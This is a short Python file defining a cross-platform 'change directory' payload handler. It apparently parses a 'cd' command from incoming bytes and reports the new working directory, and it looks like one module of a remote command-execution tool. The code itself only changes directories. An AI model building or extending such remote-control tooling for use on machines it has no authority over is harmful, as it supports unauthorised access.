import os
from payloads.absract_payload_handler import AbstractPayloadHandler

class ChangeDirectoryHandler(AbstractPayloadHandler):

    @classmethod
    def get_platform(cls):
        return "cross_platform"

    def execute_payload(self, data:bytes) -> str:           
        try:
            directory = data[3:].decode("utf-8")
            os.chdir(directory.strip())
            return "/{}\n".format(os.getcwd())
        except Exception as e:
            return "Could not change directory: %s\n" %str(e)

        